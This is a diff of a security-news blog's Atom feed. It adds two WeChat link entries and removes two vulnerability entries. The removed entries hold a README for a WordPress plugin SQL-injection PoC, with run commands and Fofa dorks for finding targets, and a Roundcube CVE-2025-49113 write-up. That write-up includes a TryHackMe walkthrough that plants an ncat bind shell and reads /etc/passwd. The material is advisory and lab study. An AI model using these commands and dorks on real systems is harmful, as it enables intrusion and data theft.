@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-17T06:15:14.300Z</updated>
+  <updated>2025-06-17T07:30:32.649Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,60 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Web3 安全入门避坑指南｜硬件钱包的常见陷阱</title>
+    <link href="http://example.com/2025/06/17/weixin_3781640012/"/>
+    <id>http://example.com/2025/06/17/weixin_3781640012/</id>
+    <published>2025-06-17T07:30:32.652Z</published>
+    <updated>2025-06-17T07:30:32.649Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 慢雾科技</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/X8_8VTqCajuJPyWwNui_rA">https://mp.weixin.qq.com/s/X8_8VTqCajuJPyWwNui_rA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 慢雾科技&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/X8_8VTqCajuJPyWwNui_rA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="慢雾科技" scheme="http://example.com/tags/%E6%85%A2%E9%9B%BE%E7%A7%91%E6%8A%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>漏洞通告  泛微E-cology9 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/17/weixin_1369086194/"/>
+    <id>http://example.com/2025/06/17/weixin_1369086194/</id>
+    <published>2025-06-17T07:15:28.435Z</published>
+    <updated>2025-06-17T07:15:28.432Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 微步在线研究响应中心</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/v7IoO-TkTWrBYWna03WW-A">https://mp.weixin.qq.com/s/v7IoO-TkTWrBYWna03WW-A</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 微步在线研究响应中心&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/v7IoO-TkTWrBYWna03WW-A&quot;&gt;https://mp.weixi</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="微步在线研究响应中心" scheme="http://example.com/tags/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E7%A0%94%E7%A9%B6%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</title>
@@ -494,59 +548,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WordPress Likes and Dislikes Plugin SQL注入漏洞</title>
-    <link href="http://example.com/2025/06/16/github_733013338/"/>
-    <id>http://example.com/2025/06/16/github_733013338/</id>
-    <published>2025-06-16T22:45:14.032Z</published>
-    <updated>2025-06-16T22:45:14.031Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> WordPress Likes and Dislikes Plugin SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5287</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> WordPress Likes and Dislikes Plugin ≤ 1.0.0版本中存在一个未认证的SQL注入漏洞，攻击者可以通过<code>my_likes_dislikes_action</code> AJAX动作中的<code>post</code>参数进行基于时间的盲注，可能导致敏感数据泄露或进一步的利用。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> WordPress Likes and Dislikes Plugin</p><p><strong>影响版本：</strong> ≤ 1.0.0</p><p><strong>搜索语法：</strong> body&#x3D;”&#x2F;wp-admin&#x2F;admin-ajax.php” or body&#x3D;”my_likes_dislikes_action”</p><p><strong>来源：</strong> <a href="https://github.com/RootHarpy/CVE-2025-5287">https://github.com/RootHarpy/CVE-2025-5287</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-5287.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-5287-PoC"><a href="#CVE-2025-5287-PoC" class="headerlink" title="CVE-2025-5287 PoC"></a>CVE-2025-5287 PoC</h2><p>Unauthenticated SQL Injection exploit for <strong>WordPress Likes and Dislikes Plugin ≤ 1.0.0</strong></p><hr><h3 id="📖-Description"><a href="#📖-Description" class="headerlink" title="📖 Description"></a>📖 Description</h3><p>This Python script is a proof-of-concept (PoC) exploit for <strong>CVE-2025-5287</strong>, targeting a vulnerability in the <strong>WordPress Likes and Dislikes Plugin ≤ 1.0.0</strong>.<br>The vulnerability allows unauthenticated attackers to perform time-based blind SQL injection via the <code>post</code> parameter in the <code>my_likes_dislikes_action</code> AJAX action, potentially leading to sensitive data exposure or further exploitation.</p><hr><h3 id="📌-Usage"><a href="#📌-Usage" class="headerlink" title="📌 Usage"></a>📌 Usage</h3><h4 id="▶️-Requirements"><a href="#▶️-Requirements" class="headerlink" title="▶️ Requirements:"></a>▶️ Requirements:</h4><ul><li>Python 3</li><li><code>requests</code> library</li></ul><p>Install required libraries:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install requests<br></code></pre></td></tr></table></figure><hr><p><strong>Arguments:</strong></p><ul><li><code>--url</code> &#x2F; <code>-u</code> : Target WordPress site URL (with HTTP&#x2F;HTTPS)</li><li><code>--sleep</code> &#x2F; <code>-s</code> : Sleep time (seconds) for detecting SQL delay (default: 5)</li></ul><hr><h4 id="▶️-Run-the-Exploit"><a href="#▶️-Run-the-Exploit" class="headerlink" title="▶️ Run the Exploit:"></a>▶️ Run the Exploit:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE-2025-5287-poc.py --url http://target.com<br></code></pre></td></tr></table></figure><p>Or with a custom sleep time:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE-2025-5287-poc.py --url http://target.com --<span class="hljs-built_in">sleep</span> 7<br></code></pre></td></tr></table></figure><hr><h3 id="🔍-Finding-Targets"><a href="#🔍-Finding-Targets" class="headerlink" title="🔍 Finding Targets"></a>🔍 Finding Targets</h3><p>You can use <strong>Fofa</strong> to discover potentially vulnerable WordPress installations running the plugin.</p><p><strong>Fofa Dork:</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">body=&quot;/wp-admin/admin-ajax.php&quot;<br></code></pre></td></tr></table></figure><p>Or to narrow down plugin-specific references:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">body=&quot;my_likes_dislikes_action&quot;<br></code></pre></td></tr></table></figure><p>Search on: <a href="https://fofa.info/">https://fofa.info</a></p><hr><h3 id="👨‍💻-Author"><a href="#👨‍💻-Author" class="headerlink" title="👨‍💻 Author"></a>👨‍💻 Author</h3><p><strong>Md Shoriful Islam (RootHarpy)</strong></p><hr><h3 id="📜-Disclaimer"><a href="#📜-Disclaimer" class="headerlink" title="📜 Disclaimer"></a>📜 Disclaimer</h3><p>This tool is created for educational and authorized penetration testing purposes only. Unauthorized use of this tool against systems without explicit permission is illegal.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; WordPress Likes and Dislikes Plugin SQL</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Roundcube 反序列化漏洞</title>
-    <link href="http://example.com/2025/06/16/github_1727128366/"/>
-    <id>http://example.com/2025/06/16/github_1727128366/</id>
-    <published>2025-06-16T22:15:11.645Z</published>
-    <updated>2025-06-16T22:15:11.642Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Roundcube 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49113</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Roundcube邮件系统中存在一个反序列化漏洞，允许攻击者在登录后执行远程命令。受影响的版本包括1.5.10及以下和1.6.10及以下。漏洞源于<code>program/actions/settings/upload.php</code>文件中对<code>_from</code>参数的处理不当，导致攻击者可以通过构造特定的请求执行任意代码。</p><p><strong>产品厂商：</strong> Roundcube</p><p><strong>产品名称：</strong> Roundcube</p><p><strong>影响版本：</strong> ≤ 1.5.10 &#x2F; 1.6.10</p><p><strong>来源：</strong> <a href="https://github.com/5kr1pt/WriteUp-Roundcube_CVE-2025-49113">https://github.com/5kr1pt/WriteUp-Roundcube_CVE-2025-49113</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>images</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49113-–-dez-anos-“em-silencio”-ate-virar-RCE-no-Roundcube"><a href="#CVE-2025-49113-–-dez-anos-“em-silencio”-ate-virar-RCE-no-Roundcube" class="headerlink" title="CVE-2025-49113 – dez anos “em silêncio” até virar RCE no Roundcube"></a>CVE-2025-49113 – dez anos “em silêncio” até virar RCE no Roundcube</h2><blockquote><p><strong>Impacto</strong>: execução remota de comandos pós-login (CVSS 9.9)<br><strong>Versões afetadas</strong>: ≤ 1.5.10 &#x2F; 1.6.10<br><strong>Patched</strong>: 1.5.11 e 1.6.11</p></blockquote><hr><h3 id="1-–-Linha-do-tempo-rapida"><a href="#1-–-Linha-do-tempo-rapida" class="headerlink" title="1 – Linha do tempo rápida"></a>1 – Linha do tempo rápida</h3><table><thead><tr><th>Data</th><th>Evento</th></tr></thead><tbody><tr><td>~2014</td><td>Introdução da rota <code>program/actions/settings/upload.php</code> com uso de <code>session-&gt;append()</code> <strong>sem validação</strong>.</td></tr><tr><td>03 jun 2025</td><td>Pesquisadores da FearsOff publicam o <em>advisory</em> e anunciam PoC.</td></tr><tr><td>04 jun 2025</td><td>Roundcube aplica <a href="https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d">commit 0376f69</a> (1.6-stable) e <a href="https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695">commit 7408f31</a> (1.5-lts).</td></tr><tr><td>06 jun 2025</td><td>PoC universal em PHP publicada em GitHub . (<a href="https://github.com/fearsoff-org/CVE-2025-49113">fearsoff-org&#x2F;CVE-2025-49113</a>)</td></tr><tr><td>10 jun 2025</td><td>Primeiros relatos de exploração em massa.</td></tr></tbody></table><hr><h3 id="2-–-Onde-estava-o-problema"><a href="#2-–-Onde-estava-o-problema" class="headerlink" title="2 – Onde estava o problema"></a>2 – Onde estava o problema</h3><h4 id="Codigo-vulneravel-1-6-10"><a href="#Codigo-vulneravel-1-6-10" class="headerlink" title="Código vulnerável (1.6.10)"></a>Código vulnerável (1.6.10)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// program/actions/settings/upload.php  (linha 30 aprox.)</span><br><span class="hljs-variable">$from</span> = rcube_utils::<span class="hljs-title function_ invoke__">get_input_string</span>(<span class="hljs-string">&#x27;_from&#x27;</span>, rcube_utils::<span class="hljs-variable constant_">INPUT_GET</span>);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(add|edit)-/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$from</span>);<br><br><span class="hljs-comment">// … mais abaixo</span><br><span class="hljs-variable">$rcmail</span>-&gt;session-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$type</span> . <span class="hljs-string">&#x27;.files&#x27;</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$attachment</span>);<br><br></code></pre></td></tr></table></figure><p>A entrada <code>_from</code> chega íntegra do GET, vira parte do nome de um nó na sessão e,<br>durante o primeiro <code>append()</code>, o Roundcube faz:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// program/actions/settings/upload.php (linha 30 aprox.)</span><br><br><span class="hljs-variable">$from</span> = rcube_utils::<span class="hljs-title function_ invoke__">get_input_string</span>(<span class="hljs-string">&#x27;_from&#x27;</span>, rcube_utils::<span class="hljs-variable constant_">INPUT_GET</span>);<br><br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(add|edit)-/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$from</span>);<br><br><span class="hljs-comment">// … mais abaixo</span><br><br><span class="hljs-variable">$rcmail</span>-&gt;session-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$type</span> . <span class="hljs-string">&#x27;.files&#x27;</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$attachment</span>);<br></code></pre></td></tr></table></figure><p>Se o arquivo existir, o RCE funcionou.</p><hr><h3 id="6-–-Mitigacoes"><a href="#6-–-Mitigacoes" class="headerlink" title="6 – Mitigações"></a>6 – Mitigações</h3><ol><li><p><strong>Atualize</strong> imediatamente para ≥ 1.6.11 ou ≥ 1.5.11.</p></li><li><p>Sem update? Bloqueie qualquer <code>_from</code> contendo <code>%22</code>, <code>%7C</code>, <code>!</code>, <code>.</code> ou bytes de controle via WAF ou rewrite.</p></li><li><p>Desative funções perigosas (<code>proc_open</code>, <code>exec</code>, etc.) em <code>php.ini</code> quando possível.</p></li><li><p>Restrinja uploads no painel de configurações e monitore logs.</p></li></ol><hr><h3 id="7-Lab-TryHackme-WriteUp"><a href="#7-Lab-TryHackme-WriteUp" class="headerlink" title="7 - Lab - TryHackme - WriteUp"></a>7 - Lab - TryHackme - WriteUp</h3><h5 id="1-Recon"><a href="#1-Recon" class="headerlink" title="1. Recon"></a>1. Recon</h5><ol><li><p>Abrir a VM (<code>MACHINE_IP</code>) e o AttackBox.</p></li><li><p>Acessar <code>http://MACHINE_IP/roundcube</code> com:</p><p> <code>usuário: ellieptic</code><br> <code>senha: ChangeMe123</code></p><p> Isso vai funcionar e vai logar normalmente:</p><p><img src="/images/Pastedimage20250616175835.png" alt="Tela de login"></p></li></ol><hr><h5 id="2-Montar-o-exploit"><a href="#2-Montar-o-exploit" class="headerlink" title="2. Montar o exploit"></a>2. Montar o exploit</h5><p>Após verificar que está tudo up, vamos executar o exploit, para isso vamos acessar a PoC postada no github informada anteriormente e fazer um gitclone:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> tmp<br><span class="hljs-built_in">cd</span> tmp<br>git <span class="hljs-built_in">clone</span> https://github.com/fearsoff-org/CVE-2025-49113<br><span class="hljs-built_in">cd</span> CVE-2025-49113<br></code></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250616180500.png" alt="exploit"> </p><hr><h5 id="3-Preparar-o-payload"><a href="#3-Preparar-o-payload" class="headerlink" title="3. Preparar o payload"></a>3. Preparar o payload</h5><p>O uso do payload é simples, basta criar o bind shell e apontar para uma porta com o file .php seguindo o usage abaixo:</p><p>php CVE-2025-49113.php &lt;<code>site</code>&gt; &lt;<code>user</code>&gt; &lt;<code>senha</code>&gt; “&lt;<code>bind shell</code>&gt;”</p><p><code>php CVE-2025-49113.php http://MACHINE_IP/roundcube ellieptic ChangeMe123 &quot;ncat -lvnp 1337 -e /bin/bash&quot;</code></p><p>– O script faz login, injeta o objeto PHP malicioso no parâmetro <code>_from</code>, conforme falamos anteriormente, chama o endpoint <code>upload.php</code> e depois força logout para disparar<br><code>session_decode()</code> → <code>unserialize()</code> → <code>proc_open()</code>.</p><blockquote><p>Às vezes ele mostra erro de CSRF; ignore e siga para o próximo passo,<br>porque o comando costuma ter sido executado mesmo assim.</p></blockquote><p><img src="/images/Pastedimage20250616180745.png" alt="exploit"> </p><hr><h5 id="4-Conectar-na-shell"><a href="#4-Conectar-na-shell" class="headerlink" title="4. Conectar na shell"></a>4. Conectar na shell</h5><p>Se a bind shell deu certo, ela ta escutando na porta 1337 que passamos, so fazermos a conexão nela agora:</p><p><code>nc MACHINE_IP 1337</code></p><p>Shell obtida.</p><p><img src="/images/Pastedimage20250616180844.png" alt="shell"> </p><hr><h5 id="5-Respondendo-as-questoes"><a href="#5-Respondendo-as-questoes" class="headerlink" title="5. Respondendo as questões"></a>5. Respondendo as questões</h5><h4 id="Questoes-e-respostas"><a href="#Questoes-e-respostas" class="headerlink" title="Questões e respostas"></a>Questões e respostas</h4><ol><li><strong>Usuário Maggie</strong><br> <em>Pergunta:</em> Um dos usuários tem o primeiro nome <strong>Maggie</strong>. Qual é o sobrenome dela?<br> <em>Resposta:</em> <code>Byte</code></li></ol><p>Para resolver essa questão podiamos dar um cat em &#x2F;etc&#x2F;passwd grepando o usuário da maggie, ou simplesmente dando um <code>ls</code>em <code>/home</code></p><p>   <img src="/images/Pastedimage20250616181115.png" alt="1">    </p><ol start="2"><li><strong>Flag em &#x2F;etc</strong><br> <em>Pergunta:</em> Qual é o valor do sinalizador salvo em <code>/etc</code>?<br> <em>Resposta:</em> <code>THM&#123;ICE_CUBE_DESERIALISATION&#125;</code></li></ol><p>Para resolver isso, dei um <code>cat /etc/flag*</code> e por sorte o nome do arquivo era flag e com isso conseguimos capturar.<br><br>  <img src="/images/Pastedimage20250616181246.png" alt="2"> </p><hr><h3 id="7-–-Referencias"><a href="#7-–-Referencias" class="headerlink" title="7 – Referências"></a>7 – Referências</h3><ul><li><p>Commit 1.6.11 – <a href="https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d">https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d</a></p></li><li><p>Commit 1.5.11 – <a href="https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695">https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695</a></p></li><li><p>FearsOff write-up – <a href="https://fearsoff.org/research/roundcube">https://fearsoff.org/research/roundcube</a></p></li><li><p>OffSec blog – <a href="https://www.offsec.com/blog/cve-2025-49113/">https://www.offsec.com/blog/cve-2025-49113/</a> <a href="https://www.offsec.com/blog/cve-2025-49113/?utm_source=chatgpt.com">offsec.com</a></p></li><li><p>TryHackme - <a href="https://tryhackme.com/room/roundcubecve202549113">TryHackMe | Roundcube: CVE-2025-49113</a> </p></li><li><p>GHSA advisory – <a href="https://github.com/advisories/GHSA-8j8w-wwqc-x596">https://github.com/advisories/GHSA-8j8w-wwqc-x596</a> <a href="https://github.com/advisories/GHSA-8j8w-wwqc-x596?utm_source=chatgpt.com">github.com</a></p></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Roundcube 反序列化漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
   </entry>
   
